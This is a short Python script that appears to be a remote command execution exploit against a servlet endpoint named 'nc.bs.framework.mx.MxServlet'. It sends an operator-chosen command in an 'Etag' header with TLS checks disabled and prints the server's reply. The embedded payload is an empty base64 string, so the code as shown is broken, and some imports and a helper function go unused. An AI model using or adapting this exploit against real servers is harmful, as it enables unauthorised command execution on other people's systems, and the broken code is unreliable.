
import requests,re,urllib3,binascii,base64,sys
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def hex_decoding(Hex):
    string=binascii.a2b_hex(Hex)
    return string
def scan(baseurl,cmd):
    if baseurl[-1]=='/':
        baseurl=baseurl
    else:
        baseurl=baseurl+"/"
    url=baseurl+'servlet/~ic/nc.bs.framework.mx.MxServlet'
    headers={
    'User-Agent': 'Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Etag': cmd}
    payload = base64.b64decode('')
    payload=payload.split(b'\r\n\r\n')[1]
    response=requests.post(url,payload,headers=headers,verify=False,timeout=15)
    print(response.content)


url=sys.argv[1]
cmd=sys.argv[2]
if url[-1]!='/':
    url+='/'
scan(url,cmd)